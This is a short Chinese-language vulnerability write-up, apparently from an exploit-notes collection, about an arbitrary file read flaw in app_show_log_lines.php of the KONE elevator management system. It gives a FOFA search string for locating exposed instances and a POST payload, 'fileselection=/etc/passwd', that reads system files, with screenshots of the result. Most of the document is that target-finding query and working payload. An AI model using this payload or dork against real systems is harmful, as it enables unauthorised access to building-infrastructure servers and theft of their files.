# KONE 通力电梯管理系统 app_show_log_lines.php 任意文件读取漏洞

## 漏洞描述

KONE 通力电梯 app_show_log_lines.php文件过滤不足导致任意文件读取漏洞

## 漏洞影响

```
KONE 通力电梯管理系统
```

## FOFA

```
"KONE Configuration management"
```

## 漏洞复现

主页面

![image-20220519184439370](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191844461.png)

发送POST请求包

```
fileselection=/etc/passwd
```

![image-20220519184600379](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191846469.png)